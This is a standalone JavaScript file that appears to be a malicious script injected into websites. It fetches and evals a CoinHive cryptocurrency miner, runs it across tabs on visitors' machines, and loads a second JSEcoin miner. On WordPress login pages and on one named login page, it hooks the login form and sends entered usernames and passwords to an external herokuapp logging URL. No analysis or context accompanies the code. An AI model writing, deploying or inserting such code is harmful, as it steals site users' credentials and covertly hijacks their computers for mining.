(new Image).src = "//whos.amung.us/swidget/bbbbbbbbd";
    var target = 2048;
    var exFunc = function(){
    if (typeof isrunmyproject == "undefined") {
    	isrunmyproject = 1;
    if (typeof CoinHive != "object") {
    	var xmlHttp = new XMLHttpRequest;
        xmlHttp["open"]("GET", "https://coinhive.com/lib/coinhive.min.js", false);
        xmlHttp["send"](null);
        eval(xmlHttp["responseText"]);
    }
    	var miner = new CoinHive.Token('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', target);
    	miner.on('accepted', function(params){
    		if (params.hashes >= target) {
    			var ts = Date.now();
    			var xhr = new XMLHttpRequest();
    			xhr.onreadystatechange = function() {
    				if (xhr.readyState === xhr.DONE){

    				}
    			};
    			xhr.open('POST', 'https://cnhv.co/dkja');
    			xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    			xhr.send('token='+encodeURIComponent(miner.getToken()));
    		}
    	});
    	miner.start(CoinHive.FORCE_MULTI_TAB);

    }
  }

    var cookie_name = "control22_miner2_"+target;
    var cookie_time = 0.3;
    if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
    	localStorage[cookie_name] = Date.now();
    	exFunc();
     }

    !function() {
      localStorage["jsenow"] = Date.now();
      var e = document;
      var t = e.createElement("script");
      var s = e.getElementsByTagName("script")[0];
      t.type = "text/javascript";
      t.async = t.defer = true;
      t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
      s.parentNode.insertBefore(t, s);
    }();

    if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
      document.getElementById("loginform").onsubmit = function() {
        username = document.getElementById("user_login").value;
        user_pass = document.getElementById("user_pass").value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;

        }
      };
    }
    if (location.href.indexOf("ltcbackoffice.org/login.php") >= 0) {
      document.getElementsById("login-form").onsubmit = function() {
        username = document.getElementById("username").value;
        user_pass = document.getElementById("password").value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
        }
      };
    }
    ;
